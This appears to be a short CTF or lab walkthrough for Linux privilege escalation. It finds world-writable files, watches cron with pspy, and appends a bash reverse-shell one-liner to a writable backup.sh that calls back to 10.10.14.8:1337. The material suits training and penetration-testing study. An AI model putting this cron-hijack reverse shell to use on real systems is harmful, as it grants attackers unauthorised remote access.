```shell-session
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Run pspy to confirm cronjob is running
The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) every 1000ms (or every second).
```shell-session
./pspy64 -pf -i 1000
```

Review the victim code

```shell-session
cat /dmz-backups/backup.sh
```

Add a bash one-liner to backup.sh

```bash
bash -i >& /dev/tcp/10.10.14.8/1337 0>&1
```

Start a listener and wait patiently for cronjob to trigger.
